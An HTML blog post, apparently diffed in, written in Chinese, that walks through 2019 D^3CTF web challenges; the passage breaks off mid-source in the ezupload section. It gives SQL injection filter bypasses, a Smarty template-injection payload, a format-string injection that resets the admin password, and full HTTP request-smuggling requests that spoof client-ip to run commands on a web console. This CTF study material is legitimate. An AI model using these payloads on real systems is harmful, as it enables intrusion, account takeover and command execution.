@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言周末去打了比赛，也就错过了这个高质量比赛，所以特地来复现一下，题目真的很不错，出题师傅们辛苦了，不过并没有都复现完，最后有一些环境都关掉了，我对那个csp bypass蛮感兴趣的，如果放了环境的话，可以再复现一下。 easywebindex函数 123456789101112public function index()&amp;#123;	if ($this-&gt;session-&gt;has_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019D^3CTF 题目复现">
+<meta property="og:url" content="http://yoursite.com/2019/11/28/2019D-3CTF-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="前言周末去打了比赛，也就错过了这个高质量比赛，所以特地来复现一下，题目真的很不错，出题师傅们辛苦了，不过并没有都复现完，最后有一些环境都关掉了，我对那个csp bypass蛮感兴趣的，如果放了环境的话，可以再复现一下。 easywebindex函数 123456789101112public function index()&amp;#123;	if ($this-&gt;session-&gt;has_">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/27/QpmebV.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/27/QC1PoR.jpg">
+<meta property="article:published_time" content="2019-11-28T09:57:49.000Z">
+<meta property="article:modified_time" content="2019-11-28T09:58:30.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/11/27/QpmebV.md.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/28/2019D-3CTF-题目复现/"/>
+
+
+
+
+
+  <title>2019D^3CTF 题目复现 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/28/2019D-3CTF-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019D^3CTF 题目复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-28T17:57:49+08:00">
+                2019-11-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末去打了比赛，也就错过了这个高质量比赛，所以特地来复现一下，题目真的很不错，出题师傅们辛苦了，不过并没有都复现完，最后有一些环境都关掉了，我对那个csp bypass蛮感兴趣的，如果放了环境的话，可以再复现一下。</p>
+<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>index函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;session-&gt;has_userdata(<span class="string">'userId'</span>)) &#123;</span><br><span class="line">		$userView = <span class="keyword">$this</span>-&gt;Render_model-&gt;get_view(<span class="keyword">$this</span>-&gt;session-&gt;userId);</span><br><span class="line">		$prouserView = <span class="string">'data:,'</span> . $userView;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;username = <span class="keyword">array</span>(<span class="string">'username'</span> =&gt; <span class="keyword">$this</span>-&gt;getUsername(<span class="keyword">$this</span>-&gt;session-&gt;userId));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ci_smarty-&gt;assign(<span class="string">'username'</span>, <span class="keyword">$this</span>-&gt;username);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ci_smarty-&gt;display($prouserView);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		redirect(<span class="string">'/user/login'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进get_view函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_view</span><span class="params">($userId)</span></span>&#123;</span><br><span class="line">	$res = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT username FROM userTable WHERE userId='$userId'"</span>)-&gt;result();</span><br><span class="line">	<span class="keyword">if</span>($res)&#123;</span><br><span class="line">		$username = $res[<span class="number">0</span>]-&gt;username;</span><br><span class="line">		$username = <span class="keyword">$this</span>-&gt;sql_safe($username);</span><br><span class="line">		$username = <span class="keyword">$this</span>-&gt;safe_render($username);</span><br><span class="line">		$userView = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT userView FROM userRender WHERE username='$username'"</span>)-&gt;result();</span><br><span class="line">		$userView = $userView[<span class="number">0</span>]-&gt;userView;</span><br><span class="line">		<span class="keyword">return</span> $userView;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>sql_safe与safe_render函数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">safe_render</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">	$username = str_replace(<span class="keyword">array</span>(<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>),<span class="string">''</span>,$username);</span><br><span class="line">	<span class="keyword">return</span> $username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)/i'</span>,$sql))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> $sql;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就会产生一个问题，我们可以通过un{ion这样的形式来bypass union select的过滤，并且可以通过username处的注入点来union select 进smarty模板注入的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$userView = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT userView FROM userRender WHERE username='$username'"</span>)-&gt;result();</span><br></pre></td></tr></table></figure>
+
+<p>payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test<span class="string">' union select 0x7b7b7068707d7d706870696e666f28293b7b7b2f7068707d7d # //十六进制转字符串为&#123;&#123;php&#125;&#125;phpinfo();&#123;&#123;/php&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>登陆进去后可以看到phpinfo的信息</p>
+<p>改一下payload，写个一句话，执行下命令就可以了</p>
+<h3 id="Showhub"><a href="#Showhub" class="headerlink" title="Showhub"></a>Showhub</h3><p>首先需要我们拿到admin账号的权限，并且题目给了部分代码，在sql语句部分存在sprintf格式化字符串漏洞，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepareInsert</span><span class="params">($baseSql, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($args)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($args <span class="keyword">as</span> $column =&gt; $value) &#123;</span><br><span class="line">            $value = addslashes($value);</span><br><span class="line">            <span class="keyword">if</span> ($value !== <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($i !== count($args) - <span class="number">1</span>) &#123;</span><br><span class="line">                    $baseSql = sprintf($baseSql, <span class="string">"`$column`,%s"</span>, <span class="string">"'$value',%s"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $baseSql = sprintf($baseSql, <span class="string">"`$column`"</span>, <span class="string">"'$value'"</span>);</span><br><span class="line">                &#125; <span class="comment">//INSERT INTO `$this-&gt;tbname`(%s) VALUE(%s)</span></span><br><span class="line">            &#125;</span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考这篇文章构造</p>
+<p><a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="noopener">https://www.cnblogs.com/test404/p/7821884.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%$&#39;,sleep(3))#</span><br></pre></td></tr></table></figure>
+
+<p>成功延时，存在此注入漏洞，</p>
+<p>不过在复现的时候好像环境有点问题，随便admin xxx就可以signup进去admin，在Nu1L的wp的姿势是</p>
+<blockquote>
+<p>利⽤ ON DUPLICATE KEY UPDATE ,当insert已经存在的记录时，执⾏Update</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;sha256(pass)%1$&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>通过此payload改完密码，以admin的身份进行登陆</p>
+<p>登陆进去后有websole,不过需要特定的ip，并且可以看到服务器是Server: ATS/7.1.2，这个服务器是存在http走私漏洞的</p>
+<p>通过走私GET请求到webconsole</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 586</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /WebConsole HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">client-ip</span>: x.xxx.xx.x</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=n5codsqicps569k8q4bcpkvbgu</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
+
+<p>把代码保存到本地看一下，是个很好看的页面，并且可以看到是通过cmd进行出传参的</p>
+<p><a href="https://imgchr.com/i/QpmebV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/27/QpmebV.md.png" alt="QpmebV.md.png"></a></p>
+<p>再走私个POST包拿到flag</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 710</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /WebConsole/exec HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/WebConsole/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=n5codsqicps569k8q4bcpkvbgu</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 13</span><br><span class="line"></span><br><span class="line">cmd=cat+/flag</span><br></pre></td></tr></table></figure>
+
+<p>这道题在拿这个cmd传参接口的地方有一些不懂的地方，特地请教了一下@Li4n0师傅</p>
+<p>这里判断IP的代码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)</span><br></pre></td></tr></table></figure>
+
+<p>代码问题为：如果ip不是正确的ipv4格式，这段代码会将其判断为内网ip。</p>
+<p>而走私的意义在于，我们的正常请求会被反代把client-ip设置为remote_addr，而我们通过走私就可以自己设置client-ip,通过拼接，最后上述问题代码在处理的时候就会将其判断为内网ip，拿到所需页面</p>
+<p>整体思路为走私一个请求使其留在缓冲区，下一次准备请求的时候，这个缓冲区留下的请求就会被发送，比如：</p>
+<p><img src="https://s2.ax1x.com/2019/11/27/QC1PoR.jpg" alt="QC1PoR.jpg"></p>
+<p>从这张图我们可以清晰的看到上一次留在缓冲区的请求，在这一次被成功发送，并且下面的请求被反代设置了client-ip，所以我们可以通过client-ip的拼接来实现内网ip检测的bypass。</p>
+<h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>])) 